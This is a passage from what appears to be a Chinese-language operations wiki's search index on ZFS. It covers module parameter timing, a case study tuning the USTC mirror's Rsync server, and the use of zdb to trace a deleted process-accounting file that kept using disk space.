\u200b\u76ee\u5f55\u200b\u4e0b\u200b\u7684\u200b\u6587\u4ef6\u200b\u8fdb\u884c\u200b\u8c03\u8282\u200b\u3002ZFS \u200b\u7684\u200b\u5185\u6838\u6a21\u5757\u200b\u53c2\u6570\u200b\u4ece\u200b\u751f\u6548\u200b\u65f6\u95f4\u200b\u4e0a\u200b\u53ef\u4ee5\u200b\u5206\u4e3a\u200b\u4e09\u7c7b\u200b\uff1a</p> <ul> <li> <p>\u200b\u4ec5\u200b\u52a0\u8f7d\u200b\u65f6\u200b\u751f\u6548\u200b\uff1a\u200b\u8fd9\u200b\u7c7b\u200b\u53c2\u6570\u200b\u5728\u200b\u52a0\u8f7d\u200b\u6a21\u5757\u200b\u65f6\u200b\u5c31\u200b\u5df2\u7ecf\u200b\u786e\u5b9a\u200b\uff0c\u200b\u65e0\u6cd5\u200b\u5728\u200b\u8fd0\u884c\u200b\u65f6\u200b\u4fee\u6539\u200b\u3002\u200b\u5982\u679c\u200b\u9700\u8981\u200b\u4f7f\u7528\u200b\u975e\u200b\u9ed8\u8ba4\u503c\u200b\u7684\u8bdd\u200b\uff0c\u200b\u9700\u8981\u200b\u5728\u200b\u52a0\u8f7d\u200b\u6a21\u5757\u200b\u7684\u200b\u65f6\u5019\u200b\u5c31\u200b\u6307\u5b9a\u200b\u3002\u200b\u4e00\u822c\u200b\u5728\u200b <code>/etc/modprobe.d/zfs.conf</code> \u200b\u6587\u4ef6\u200b\u6765\u200b\u6307\u5b9a\u200b\u3002</p> \u200b\u4f7f\u7528\u200b modprobe.d \u200b\u914d\u7f6e\u200b ZFS \u200b\u6a21\u5757\u200b\u53c2\u6570\u200b\u7684\u200b\u81ea\u52a8\u200b\u52a0\u8f7d\u200b <p>\u200b\u5728\u200b <code>/etc/modprobe.d/zfs.conf</code> \u200b\u4e2d\u200b\u6dfb\u52a0\u200b\u4ee5\u4e0b\u5185\u5bb9\u200b\uff1a</p> <pre><code>options zfs zfs_arc_max=4294967296\n</code></pre> <p>\u200b\u8fd9\u6837\u200b\u5728\u200b\u4e0b\u6b21\u200b\u52a0\u8f7d\u200b ZFS \u200b\u6a21\u5757\u200b\u65f6\u200b\uff0c<code>zfs_arc_max</code> \u200b\u53c2\u6570\u200b\u5c31\u200b\u4f1a\u200b\u88ab\u200b\u8bbe\u7f6e\u200b\u4e3a\u200b 4 GiB\u3002</p> </li> <li> <p>import \u200b\u65f6\u200b\u751f\u6548\u200b\uff1a\u200b\u8fd9\u200b\u7c7b\u200b\u53c2\u6570\u200b\u53ef\u4ee5\u200b\u5728\u200b\u8fd0\u884c\u200b\u65f6\u200b\u901a\u8fc7\u200b\u8bfb\u5199\u200b sysfs \u200b\u8fdb\u884c\u200b\u8c03\u8282\u200b\uff0c\u200b\u4f46\u200b\u65b0\u200b\u7684\u200b\u503c\u200b\u53ea\u6709\u200b\u5728\u200b\u4e0b\u6b21\u200b\u5bfc\u5165\u200b pool \u200b\u65f6\u624d\u200b\u4f1a\u200b\u751f\u6548\u200b\u3002\u200b\u5982\u679c\u200b\u9700\u8981\u200b\u5bf9\u200b\u4f7f\u7528\u200b\u4e2d\u200b\u7684\u200b pool \u200b\u4fee\u6539\u200b\u8fd9\u4e9b\u200b\u53c2\u6570\u200b\uff0c\u200b\u9700\u8981\u200b\u5148\u200b <code>zpool export</code> \u200b\u518d\u200b <code>zpool import</code>\u3002</p> </li> <li>\u200b\u7acb\u5373\u200b\u751f\u6548\u200b\uff1a\u200b\u8fd9\u200b\u7c7b\u200b\u53c2\u6570\u200b\u53ef\u4ee5\u200b\u5728\u200b\u8fd0\u884c\u200b\u65f6\u200b\u901a\u8fc7\u200b\u8bfb\u5199\u200b sysfs \u200b\u8fdb\u884c\u200b\u8c03\u8282\u200b\uff0c\u200b\u4e14\u200b\u7acb\u5373\u200b\u751f\u6548\u200b\u3002</li> </ul> <p>\u200b\u5b8c\u6574\u200b\u7684\u200b\u5185\u6838\u6a21\u5757\u200b\u53c2\u6570\u200b\u5217\u8868\u200b\u8bf7\u53c2\u9605\u200b <code>zfs(4)</code>\u3002</p> <p>\u200b\u6700\u200b\u5e38\u200b\u8c03\u8282\u200b\u7684\u200b ZFS \u200b\u6a21\u5757\u200b\u53c2\u6570\u200b\u5176\u5b9e\u200b\u53ea\u6709\u200b\u4e00\u4e2a\u200b\uff0c\u200b\u90a3\u200b\u5c31\u662f\u200b <code>zfs_arc_max</code>\uff0c\u200b\u5373\u200b ZFS \u200b\u4f7f\u7528\u200b\u7cfb\u7edf\u200b\u5185\u5b58\u200b\u4f5c\u4e3a\u200b ARC \u200b\u7684\u200b\u6700\u5927\u503c\u200b\uff0c\u200b\u8be6\u60c5\u8bf7\u200b\u89c1\u200b\u524d\u9762\u200b\u7684\u200b\u7ae0\u8282\u200b\u3002</p>"},{"location":"ops/storage/zfs/#tuning-example","title":"\u6848\u4f8b","text":"\u6848\u4f8b\u200b\uff1a\u200b\u901a\u8fc7\u200b\u8c03\u8282\u200b\u53c2\u6570\u200b\u964d\u4f4e\u200b\u955c\u50cf\u200b\u7ad9\u200b\u7684\u200b\u78c1\u76d8\u200b\u8d1f\u8f7d\u200b <p>USTC \u200b\u955c\u50cf\u200b\u7ad9\u200b\u7684\u200b Rsync \u200b\u670d\u52a1\u5668\u200b\u91c7\u7528\u200b 11 \u200b\u5757\u200b\u76d8\u200b\u7684\u200b RAID-Z3\uff08\u200b\u53e6\u6709\u200b\u4e00\u5757\u200b\u70ed\u5907\u200b\u76d8\u200b\uff0c\u200b\u5171\u200b 12 \u200b\u5757\u200b\u673a\u68b0\u200b\u786c\u76d8\u200b\uff09\uff0c\u200b\u7edd\u5927\u591a\u6570\u200b\u53c2\u6570\u200b\u4f7f\u7528\u200b\u9ed8\u8ba4\u200b\u914d\u7f6e\u200b\uff0c\u200b\u6240\u6709\u200b\u673a\u68b0\u200b\u786c\u76d8\u200b\u957f\u671f\u200b\u5904\u4e8e\u200b 90% \u200b\u4ee5\u4e0a\u200b\u7684\u200b\u8d1f\u8f7d\u200b\uff0c\u200b\u8bfb\u5199\u200b\u6027\u80fd\u200b\u8f83\u5dee\u200b\u3002</p> <p>2024 \u200b\u5e74\u200b 6 \u200b\u6708\u5e95\u200b\uff0cUSTCLUG \u200b\u7684\u200b\u540c\u5b66\u200b\u4eec\u200b\u7ecf\u8fc7\u200b\u8c03\u7814\u200b\uff0c\u200b\u51b3\u5b9a\u200b\u62c6\u9664\u200b RAID-Z3\uff0c\u200b\u6539\u4e3a\u200b\u6bcf\u200b 6 \u200b\u5757\u200b\u76d8\u200b\u4e00\u7ec4\u200b RAID-Z2\uff0c\u200b\u603b\u200b\u53ef\u7528\u200b\u5bb9\u91cf\u200b\u4ecd\u7136\u200b\u76f8\u5f53\u4e8e\u200b 8 \u200b\u5757\u200b\u76d8\u200b\u3002\u200b\u5728\u200b\u5efa\u7acb\u200b\u7528\u4e8e\u200b\u5b58\u50a8\u200b\u5404\u200b\u955c\u50cf\u200b\u4ed3\u5e93\u200b\u7684\u200b dataset \u200b\u65f6\u200b\uff0c\u200b\u6211\u4eec\u200b\u8bbe\u7f6e\u200b\u4e86\u200b\u4ee5\u4e0b\u200b\u53c2\u6570\u200b\uff1a</p> \u200b\u53c2\u6570\u200b \u200b\u65e7\u503c\u200b \u200b\u65b0\u503c\u200b \u200b\u8003\u8651\u200b recordsize 128K\uff08\u200b\u9ed8\u8ba4\u200b\uff09 1M \u200b\u955c\u50cf\u200b\u7ad9\u200b\u7684\u200b\u4e3b\u8981\u200b\u8d1f\u8f7d\u200b\uff08\u200b\u4e0d\u8bba\u662f\u200b HTTP \u200b\u8fd8\u662f\u200b Rsync\uff09\u200b\u4e3a\u200b\u6574\u4e2a\u200b\u6587\u4ef6\u200b\u7684\u200b\u987a\u5e8f\u200b\u8bfb\u5199\u200b\uff0c\u200b\u56e0\u6b64\u200b\u5c06\u200b recordsize \u200b\u8bbe\u200b\u4e3a\u200b\u5141\u8bb8\u200b\u7684\u200b\u6700\u5927\u503c\u200b\u53ef\u4ee5\u200b\u51cf\u5c11\u200b\u968f\u673a\u200b\u8bfb\u5199\u200b\u3002 compression off\uff08\u200b\u9ed8\u8ba4\u200b\uff09 zstd \u200b\u5c3d\u7ba1\u200b\u955c\u50cf\u200b\u7ad9\u200b\u7684\u200b\u5927\u90e8\u5206\u200b\u6570\u636e\u200b\u90fd\u200b\u662f\u200b\u5df2\u7ecf\u200b\u538b\u7f29\u200b\u8fc7\u200b\u7684\u200b\uff08\u200b\u5982\u200b\u8f6f\u4ef6\u200b\u538b\u7f29\u5305\u200b\uff09\uff0c\u200b\u4f46\u662f\u200b <code>compression=zstd</code> \u200b\u4ecd\u7136\u200b\u4e3a\u200b\u6211\u4eec\u200b\u5e26\u6765\u200b\u4e86\u200b 1.0625 \u200b\u7684\u200b\u6574\u4f53\u200b\u538b\u7f29\u7387\u200b\uff0c\u200b\u8282\u7701\u200b\u4e86\u200b\u7ea6\u200b 2.4 TiB \u200b\u7684\u200b\u78c1\u76d8\u7a7a\u95f4\u200b\u3002\u200b\u5bf9\u4e8e\u200b\u4e00\u4e2a\u200b\u957f\u671f\u200b\u4f7f\u7528\u200b\u8d85\u8fc7\u200b 90% \u200b\u5bb9\u91cf\u200b\u7684\u200b ZFS pool \u200b\u800c\u8a00\u200b\uff0c\u200b\u66f4\u200b\u591a\u200b\u7684\u200b\u7a7a\u95f2\u200b\u7a7a\u95f4\u200b\u610f\u5473\u7740\u200b\u66f4\u597d\u200b\u7684\u200b\u8bfb\u5199\u200b\u6027\u80fd\u200b\u3002 xattratime off off\uff08\u200b\u672a\u4fee\u6539\u200b\uff09 \u200b\u955c\u50cf\u200b\u4ed3\u5e93\u200b\u6570\u636e\u200b\u4e0d\u200b\u9700\u8981\u200b\u6269\u5c55\u200b\u5c5e\u6027\u200b\uff0c\u200b\u4e5f\u200b\u65e0\u9700\u200b\u8bb0\u5f55\u200b atime\u3002 setuidexecdevices on\uff08\u200b\u9ed8\u8ba4\u200b\uff09 off \u200b\u955c\u50cf\u200b\u4ed3\u5e93\u200b\u4e0d\u200b\u9700\u8981\u200b\u53ef\u200b\u6267\u884c\u200b / SUID / \u200b\u8bbe\u5907\u200b\u6587\u4ef6\u200b\u7b49\u200b\u529f\u80fd\u200b\u3002 sync standard\uff08\u200b\u9ed8\u8ba4\u200b\uff09 disabled \u200b\u955c\u50cf\u200b\u4ed3\u5e93\u200b\u7684\u200b\u6570\u636e\u200b\u4e0d\u200b\u9700\u8981\u200b\u4fdd\u8bc1\u200b\u5199\u5165\u200b\u5b8c\u6574\u6027\u200b\uff0c\u200b\u56e0\u6b64\u200b\u53ef\u4ee5\u200b\u727a\u7272\u200b sync \u200b\u8bed\u4e49\u200b\u6362\u53d6\u200b\u66f4\u597d\u200b\u7684\u200b\u5199\u5165\u200b\u6027\u80fd\u200b\u548c\u200b\u66f4\u200b\u5c11\u200b\u7684\u200b\u788e\u7247\u200b\u3002 secondarycache all\uff08\u200b\u9ed8\u8ba4\u200b\uff09 metadata \u200b\u4f5c\u4e3a\u200b Rsync \u200b\u670d\u52a1\u5668\u200b\uff0c\u200b\u4e0d\u540c\u200b\u6587\u4ef6\u200b\u7684\u200b\u70ed\u5ea6\u200b\u4e0d\u4f1a\u200b\u5dee\u592a\u591a\u200b\uff0c\u200b\u56e0\u6b64\u200b\u5c06\u200b L2ARC \u200b\u53ea\u200b\u7528\u4e8e\u200b\u7f13\u5b58\u200b ZFS \u200b\u5143\u200b\u6570\u636e\u200b\u53ef\u4ee5\u200b\u964d\u4f4e\u200b\u56fa\u6001\u200b\u786c\u76d8\u200b\u7684\u200b\u78e8\u635f\u200b\u3002 redundant_metadata all\uff08\u200b\u9ed8\u8ba4\u200b\uff09 some \u200b\u955c\u50cf\u200b\u7ad9\u200b\u7684\u200b\u6570\u636e\u200b\u53ef\u4ee5\u200b\u63a5\u53d7\u200b\u4e00\u5b9a\u200b\u7a0b\u5ea6\u200b\u7684\u200b\u635f\u574f\u200b\uff08\u200b\u5f88\u200b\u5bb9\u6613\u200b\u6062\u590d\u200b\uff09\uff0c\u200b\u56e0\u6b64\u200b\u53ef\u4ee5\u200b\u727a\u7272\u200b\u4e00\u90e8\u5206\u200b\u5197\u4f59\u5ea6\u200b\u6362\u53d6\u200b\u66f4\u200b\u9ad8\u200b\u7684\u200b\u6027\u80fd\u200b\u3002 <p>\u200b\u6211\u4eec\u200b\u4e5f\u200b\u8c03\u8282\u200b\u4e86\u200b ZFS \u200b\u7684\u200b\u8fd0\u884c\u200b\u53c2\u6570\u200b\uff1a</p> \u200b\u53c2\u6570\u200b \u200b\u65e7\u503c\u200b \u200b\u65b0\u503c\u200b \u200b\u8003\u8651\u200b zfs_arc_maxzfs_arc_min 150 GiB 150 GiB\uff08\u200b\u672a\u4fee\u6539\u200b\uff09 \u200b\u955c\u50cf\u200b\u7ad9\u200b\u670d\u52a1\u5668\u200b\u5177\u6709\u200b 256 GB \u200b\u5185\u5b58\u200b\uff0c\u200b\u56e0\u6b64\u200b\u6211\u4eec\u200b\u5c06\u200b ARC \u200b\u7684\u200b\u8bbe\u4e3a\u200b\u56fa\u5b9a\u200b\u7684\u200b 150 GiB\uff0c\u200b\u4ee5\u200b\u4fdd\u8bc1\u200b ZFS \u200b\u80fd\u591f\u200b\u5145\u5206\u5229\u7528\u200b\u5185\u5b58\u200b\u3002 zfs_dmu_offset_next_sync 1 1\uff08\u200b\u9ed8\u8ba4\u200b\uff09 zfs_arc_dnode_limit_percent 10%\uff08\u200b\u9ed8\u8ba4\u200b\uff09 80% Rsync \u200b\u670d\u52a1\u200b\u9700\u8981\u200b\u53cd\u590d\u200b\u8bbf\u95ee\u200b\u6587\u4ef6\u200b\u7684\u200b\u5143\u200b\u4fe1\u606f\u200b\uff08inode\uff09\uff0c\u200b\u56e0\u6b64\u200b\u5141\u8bb8\u200b ZFS ARC \u200b\u7f13\u5b58\u200b\u66f4\u5927\u200b\u6bd4\u4f8b\u200b\u7684\u200b\u8fd9\u4e9b\u200b\u5185\u5bb9\u200b\u3002 zfs_immediate_write_sz 32 KiB\uff08\u200b\u9ed8\u8ba4\u200b\uff09 16 MiB \u200b\u955c\u50cf\u200b\u7ad9\u200b\u7684\u200b\u6570\u636e\u200b\u5199\u5165\u200b\u662f\u200b\u6279\u91cf\u200b\u7684\u200b\uff0c\u200b\u56e0\u6b64\u200b\u5c06\u200b\u6b64\u53c2\u6570\u200b\u8c03\u5927\u200b\u53ef\u4ee5\u200b\u51cf\u5c11\u200b\u5199\u5165\u200b\u788e\u7247\u200b\u3002 zfs_vdev_async_read_max_activezfs_vdev_async_read_min_activezfs_vdev_scrub_max_activezfs_vdev_max_active \uff08\u200b\u672a\u77e5\u200b\uff09 82520000 \u200b\u5141\u8bb8\u200b ZFS \u200b\u4f7f\u7528\u200b\u66f4\u6df1\u200b\u7684\u200b I/O \u200b\u961f\u5217\u200b\u3002 zfs_arc_lotsfree_percent 10%\uff08\u200b\u9ed8\u8ba4\u200b\uff09 0 \u200b\u955c\u50cf\u200b\u670d\u52a1\u5668\u200b\u5185\u5b58\u200b\u5145\u8db3\u200b\uff0cARC \u200b\u65e0\u9700\u200b\u7406\u4f1a\u200b\u5185\u5b58\u200b\u538b\u529b\u200b\u3002 l2arc_headrooml2arc_write_maxl2arc_noprefetch \uff08\u200b\u672a\u77e5\u200b\uff09 8671088640 <p>\u200b\u4f7f\u7528\u200b\u65b0\u200b\u7684\u200b RAID \u200b\u7ec4\u5408\u200b\u548c\u200b ZFS \u200b\u53c2\u6570\u200b\u8c03\u8282\u200b\u540e\u200b\uff0c\u200b\u955c\u50cf\u200b\u7ad9\u200b\u78c1\u76d8\u200b\u7684\u200b\u7a33\u5b9a\u200b\u8d1f\u8f7d\u200b\u4ece\u200b 90% \u200b\u964d\u4f4e\u200b\u5230\u200b\u4e86\u200b 20% \u200b\u4ee5\u4e0b\u200b\uff1a</p> <p></p> <p>USTC \u200b\u955c\u50cf\u200b\u7ad9\u200b Rsync \u200b\u670d\u52a1\u5668\u200b\u4e00\u6bb5\u200b 30 \u200b\u5929\u5185\u200b\u7684\u200b\u78c1\u76d8\u200b\u6d3b\u52a8\u200b\u65f6\u95f4\u200b\u3002\u200b\u5de6\u8fb9\u200b\u4e3a\u200b\u65e7\u200b\u7684\u200b RAID-Z3 \u200b\u9635\u5217\u200b\uff0c\u200b\u6b63\u4e2d\u95f4\u200b\u4e3a\u200b\u91cd\u5efa\u200b\u671f\u95f4\u200b\uff083 \u200b\u5929\u200b\uff09\uff0c\u200b\u53f3\u8fb9\u200b\u4e3a\u200b\u65b0\u200b\u7684\u200b RAID-Z2 \u200b\u9635\u5217\u200b\u3002</p> <p>\u200b\u503c\u5f97\u4e00\u63d0\u7684\u662f\u200b\uff0c\u200b\u7531\u4e8e\u200b\u91cd\u5efa\u200b\u9635\u5217\u200b\u540e\u200b\u91cd\u65b0\u200b\u540c\u6b65\u200b\u4e86\u200b\u6240\u6709\u200b\u4ed3\u5e93\u200b\u6570\u636e\u200b\uff0c\u200b\u65b0\u200b\u7684\u200b\u9635\u5217\u200b\u4e2d\u200b\u788e\u7247\u200b\u5316\u200b\u7a0b\u5ea6\u200b\u663e\u8457\u200b\u4e0b\u964d\u200b\u3002\u200b\u7531\u4e8e\u200b\u6211\u4eec\u200b\u6ca1\u6709\u200b\u8bb0\u5f55\u200b\u5177\u4f53\u200b\u7684\u200b\u6570\u636e\u200b\uff0c\u200b\u6211\u4eec\u200b\u65e0\u6cd5\u200b\u786e\u5b9a\u200b\u788e\u7247\u200b\u5316\u200b\u7a0b\u5ea6\u200b\u5bf9\u200b\u9635\u5217\u200b\u8bfb\u200b\u6027\u80fd\u200b\u7684\u200b\u5f71\u54cd\u200b\u3002</p>"},{"location":"ops/storage/zfs/#debugging","title":"\u8c03\u8bd5","text":"<p>ZFS \u200b\u63d0\u4f9b\u200b\u4e86\u200b\u8c03\u8bd5\u200b\u5de5\u5177\u200b <code>zdb</code>\uff0c\u200b\u53ef\u4ee5\u200b\u7528\u4e8e\u200b\u67e5\u770b\u200b pool \u200b\u548c\u200b\u6587\u4ef6\u7cfb\u7edf\u200b\u7684\u200b\u5185\u90e8\u7ed3\u6784\u200b\u3002 \u200b\u5728\u200b\u9047\u5230\u200b\u65e0\u6cd5\u89e3\u91ca\u200b\u7684\u200b\u95ee\u9898\u200b\u65f6\u200b\uff0c\u200b\u4f7f\u7528\u200b <code>zdb</code> \u200b\u53ef\u80fd\u200b\u53ef\u4ee5\u200b\u5e2e\u52a9\u200b\u8c03\u8bd5\u200b\u95ee\u9898\u200b\u3002</p> <p>\u200b\u9700\u8981\u200b\u6ce8\u610f\u200b\u7684\u200b\u662f\u200b\uff1a</p> <ul> <li><code>zdb</code> \u200b\u4e0d\u200b\u5173\u5fc3\u200b pool \u200b\u6216\u8005\u200b\u6587\u4ef6\u7cfb\u7edf\u200b\u662f\u5426\u200b\u6302\u8f7d\u200b\uff0c\u200b\u5b83\u200b\u90fd\u200b\u4f1a\u200b\u76f4\u63a5\u200b\u8bbf\u95ee\u200b\u5757\u200b\u8bbe\u5907\u200b\u3002\u200b\u56e0\u6b64\u200b\u5728\u200b\u6b63\u5728\u200b\u4f7f\u7528\u200b\u7684\u200b pool \u200b\u6216\u8005\u200b\u6587\u4ef6\u7cfb\u7edf\u200b\u4e0a\u200b\u4f7f\u7528\u200b <code>zdb</code> \u200b\u53ef\u80fd\u200b\u4f1a\u200b\u5f97\u5230\u200b\u4e0d\u200b\u4e00\u81f4\u200b\u7684\u200b\u7ed3\u679c\u200b\uff1b</li> <li><code>zdb</code> \u200b\u7684\u200b\u8f93\u51fa\u200b\u683c\u5f0f\u200b\u6ca1\u6709\u200b\u6587\u6863\u200b\u8bf4\u660e\u200b\uff0c\u200b\u56e0\u4e3a\u200b\u5176\u200b\u5047\u8bbe\u200b\u4f7f\u7528\u8005\u200b\u4e86\u89e3\u200b ZFS \u200b\u7684\u200b\u5185\u90e8\u7ed3\u6784\u200b\uff1b</li> <li><code>zdb</code> \u200b\u652f\u6301\u200b\u5199\u5165\u200b\u5185\u5bb9\u200b\uff0c\u200b\u4f46\u662f\u200b\u5728\u200b\u4e0d\u200b\u4e86\u89e3\u200b ZFS \u200b\u5185\u90e8\u7ed3\u6784\u200b\u7684\u200b\u60c5\u51b5\u200b\u4e0b\u200b\uff0c\u200b\u5efa\u8bae\u200b\u4ee5\u200b\u53ea\u8bfb\u200b\u65b9\u5f0f\u200b\u4f7f\u7528\u200b <code>zdb</code>\u3002</li> </ul> <p>\u200b\u4ee5\u4e0b\u200b\u63d0\u4f9b\u200b\u4e86\u200b\u4e00\u4e2a\u200b\u4f7f\u7528\u200b <code>zdb</code> \u200b\u8c03\u8bd5\u200b\u51fa\u200b\u751f\u4ea7\u200b\u73af\u5883\u200b\u300c\u200b\u672a\u89e3\u200b\u4e4b\u8c1c\u200b\u300d\u200b\u7684\u200b\u4f8b\u5b50\u200b\uff1a</p> \u200b\u6848\u4f8b\u200b\uff1a\u200b\u4f7f\u7528\u200b <code>zdb</code> \u200b\u5e2e\u52a9\u200b\u627e\u51fa\u200b\u6587\u4ef6\u7cfb\u7edf\u200b\u4f7f\u7528\u200b\u7a7a\u95f4\u200b\u5f02\u5e38\u200b\u7684\u200b\u539f\u56e0\u200b <p>\u200b\u4e00\u53f0\u200b\u4f7f\u7528\u200b ZFS \u200b\u7684\u200b\u670d\u52a1\u5668\u200b\u5c06\u200b <code>/var/log</code> \u200b\u6302\u8f7d\u200b\u5728\u200b\u4e86\u200b ZFS \u200b\u6587\u4ef6\u7cfb\u7edf\u200b\u4e2d\u200b\uff1a</p> <pre><code>NAME        USED  AVAIL  REFER  MOUNTPOINT\npool1/log  2.88G   181G  2.88G  /var/log\n</code></pre> <p>\u200b\u4f46\u662f\u200b\u7cfb\u7edf\u7ba1\u7406\u5458\u200b\u53d1\u73b0\u200b <code>/var/log</code> \u200b\u7684\u200b\u4f7f\u7528\u200b\u7a7a\u95f4\u200b\u4f1a\u200b\u5f02\u5e38\u200b\u589e\u5927\u200b\uff0c\u200b\u76f4\u5230\u200b\u5927\u90e8\u5206\u200b\u7a7a\u95f4\u200b\u90fd\u200b\u88ab\u200b\u5360\u7528\u200b\uff1a</p> <pre><code>NAME       USED  AVAIL     REFER  MOUNTPOINT\npool1/log  173G  3.43G      173G  /var/log\n</code></pre> <p>\u200b\u4f46\u662f\u200b\u5b9e\u9645\u200b\u7684\u200b log \u200b\u5927\u5c0f\u200b\u53ea\u6709\u200b\u4e0d\u5230\u200b 3G\uff1a</p> <pre><code>$ sudo du -sh .\n2.9G  .\n</code></pre> <p>\u200b\u540c\u65f6\u200b\u6ca1\u6709\u200b\u5feb\u7167\u200b\uff0c\u200b\u901a\u8fc7\u200b <code>lsof</code> \u200b\u68c0\u67e5\u200b\u4e5f\u200b\u6ca1\u6709\u200b\u8fdb\u7a0b\u200b\u5360\u7528\u200b\u5728\u200b <code>/var/log</code> \u200b\u4e0b\u200b\u5df2\u7ecf\u200b\u88ab\u200b\u5220\u9664\u200b\u7684\u200b\u6587\u4ef6\u200b\u3002 \u200b\u91cd\u542f\u200b\u540e\u200b\u6587\u4ef6\u7cfb\u7edf\u200b\u7684\u200b\u4f7f\u7528\u200b\u7a7a\u95f4\u200b\u53c8\u200b\u6062\u590d\u200b\u5230\u200b\u4e86\u200b\u6b63\u5e38\u200b\u7684\u200b\u5927\u5c0f\u200b\u3002\u200b\u6ca1\u6709\u200b\u4eba\u200b\u80fd\u591f\u200b\u89e3\u91ca\u200b\u539f\u56e0\u200b\u3002</p> <p>\u200b\u5728\u200b\u65f6\u9694\u200b\u534a\u5e74\u200b\u53c8\u200b\u4e00\u6b21\u200b\u56e0\u6b64\u200b\u91cd\u542f\u200b\u540e\u200b\uff0c\u200b\u7cfb\u7edf\u7ba1\u7406\u5458\u200b\u51b3\u5b9a\u200b\u4f7f\u7528\u200b <code>zdb</code> \u200b\u6765\u200b\u67e5\u770b\u200b\u6587\u4ef6\u7cfb\u7edf\u200b\u7684\u200b\u5185\u90e8\u7ed3\u6784\u200b\uff1a</p> <pre><code>$ sudo zdb -dddd pool1/log &gt; zdb-log.txt\n</code></pre> <p>\u200b\u68c0\u67e5\u200b\u8f93\u51fa\u200b\uff0c\u200b\u53d1\u73b0\u200b\u4e00\u4e2a\u200b\u7279\u522b\u200b\u5927\u200b\u7684\u200b\u6587\u4ef6\u200b\uff1a</p> <pre><code>Object  lvl   iblk   dblk  dsize  dnsize  lsize   %full  type\n  6426    4   128K   128K   170G     512  1.02T  100.00  ZFS plain file\n                                           168   bonus  System attributes\ndnode flags: USED_BYTES USERUSED_ACCOUNTED USEROBJUSED_ACCOUNTED \ndnode maxblkid: 8554489\nuid     0\ngid     4\natime   Thu Aug 17 19:22:48 2023\nmtime   Sun Feb 18 16:05:29 2024\nctime   Sun Feb 18 16:05:29 2024\ncrtime  Thu Aug 17 06:25:01 2023\ngen 30893491\nmode    100640\nsize    1121254014464\nparent  7279\nlinks   0\npflags  40800000004\n</code></pre> <p>\"6426\" \u200b\u8fd9\u4e2a\u200b\u5bf9\u8c61\u200b\u4e5f\u200b\u51fa\u73b0\u200b\u5728\u200b\u4e86\u200b ZFS delete queue \u200b\u4e2d\u200b\uff1a</p> <pre><code>Object  lvl   iblk   dblk  dsize  dnsize  lsize   %full  type\n     3    1   128K     6K      0     512     6K  100.00  ZFS delete queue\ndnode flags: USED_BYTES USERUSED_ACCOUNTED USEROBJUSED_ACCOUNTED \ndnode maxblkid: 0\nmicrozap: 6144 bytes, 1 entries\n\n    191a = 6426 \n</code></pre> <p>\u200b\u770b\u8d77\u6765\u200b\u662f\u200b\u8fd9\u4e2a\u200b\u6587\u4ef6\u200b\u4e0d\u505c\u200b\u589e\u5927\u200b\uff0c\u200b\u4f46\u662f\u200b ZFS \u200b\u6ca1\u6709\u200b\u5220\u9664\u200b\u3002\u200b\u68c0\u67e5\u200b 6426 \u200b\u7684\u200b parent 7279\uff1a</p> <pre><code>Object  lvl   iblk   dblk  dsize  dnsize  lsize   %full  type\n  7279    1   128K  2.50K     8K     512  2.50K  100.00  ZFS directory\n                                           168   bonus  System attributes\ndnode flags: USED_BYTES USERUSED_ACCOUNTED USEROBJUSED_ACCOUNTED \ndnode maxblkid: 0\nuid     0\ngid     0\natime   Mon Jun 24 01:32:06 2019\nmtime   Fri Mar  8 06:25:02 2024\nctime   Fri Mar  8 06:25:02 2024\ncrtime  Tue Feb 27 21:11:06 2018\ngen 4369970\nmode    40755\nsize    33\nparent  4\nlinks   2\npflags  40800000144\nmicrozap: 2560 bytes, 31 entries\n\n    pacct.6.gz = 3908 (type: Regular File)\n    pacct.17.gz = 1994 (type: Regular File)\n    pacct.16.gz = 275 (type: Regular File)\n    pacct.7.gz = 3518 (type: Regular File)\n    pacct.5.gz = 473 (type: Regular File)\n    pacct.14.gz = 1554 (type: Regular File)\n    pacct.15.gz = 651 (type: Regular File)\n    pacct.4.gz = 109 (type: Regular File)\n    pacct.29.gz = 468 (type: Regular File)\n    pacct.11.gz = 1863 (type: Regular File)\n    pacct.10.gz = 2129 (type: Regular File)\n    pacct.1.gz = 1294 (type: Regular File)\n    pacct.28.gz = 3648 (type: Regular File)\n    pacct.3.gz = 1864 (type: Regular File)\n    pacct.12.gz = 3516 (type: Regular File)\n    pacct.13.gz = 2128 (type: Regular File)\n    pacct.2.gz = 2955 (type: Regular File)\n    pacct.22.gz = 649 (type: Regular File)\n    pacct.23.gz = 3649 (type: Regular File)\n    pacct.8.gz = 3400 (type: Regular File)\n    pacct.19.gz = 535 (type: Regular File)\n    pacct = 796 (type: Regular File)\n    pacct.21.gz = 534 (type: Regular File)\n    pacct.0 = 904 (type: Regular File)\n    pacct.20.gz = 3725 (type: Regular File)\n    pacct.18.gz = 3515 (type: Regular File)\n    pacct.9.gz = 1293 (type: Regular File)\n    pacct.24.gz = 3905 (type: Regular File)\n    pacct.25.gz = 903 (type: Regular File)\n    pacct.27.gz = 1552 (type: Regular File)\n    pacct.26.gz = 1176 (type: Regular File)\n</code></pre> <p>\u200b\u53d1\u73b0\u200b\u8be5\u200b\u76ee\u5f55\u200b\u4e3a\u200b <code>/var/log/account</code>\uff0c\u200b\u8c03\u67e5\u200b\u540e\u200b\u53d1\u73b0\u200b\u5176\u4e2d\u200b\u7684\u200b\u6587\u4ef6\u200b\u5728\u200b\u542f\u7528\u200b process accounting \u200b\u540e\u4f1a\u200b\u7531\u200b\u5185\u6838\u200b\u5199\u5165\u200b\u3002 \u200b\u56e0\u6b64\u200b\u89e3\u91ca\u200b\u4e86\u200b\u4e3a\u4ec0\u4e48\u200b <code>lsof</code> \u200b\u6ca1\u6709\u200b\u663e\u793a\u200b\u4efb\u4f55\u200b\u8fdb\u7a0b\u200b\u5360\u7528\u200b\u5bf9\u5e94\u200b\u6587\u4ef6\u200b\u3002\u200b\u5728\u200b\u5173\u95ed\u200b process accounting \u200b\u540e\u200b\uff0cdelete queue \u200b\u6e05\u7a7a\u200b\u4e86\u200b\u3002</p> <p>\u200b\u8be5\u200b\u95ee\u9898\u200b\u5df2\u7ecf\u200b\u5c1d\u8bd5\u200b\u5411\u200b ZFS \u200b\u53cd\u9988\u200b\uff1ahttps://github.com/openzfs/zfs/issues/15998\u3002 \u200b\u5728\u200b\u6536\u5230\u200b issue \u200b\u56de\u590d\u200b\u4e4b\u540e\u200b\u68c0\u67e5\u200b\u4e86\u200b Debian \u200b\u7684\u200b acct \u200b\u7684\u200b cron daily \u200b\u811a\u672c\u200b\uff0c\u200b\u53d1\u73b0\u200b\u5176\u200b\u4f7f\u7528\u200b\u4e86\u200b <code>invoke-rc.d</code> 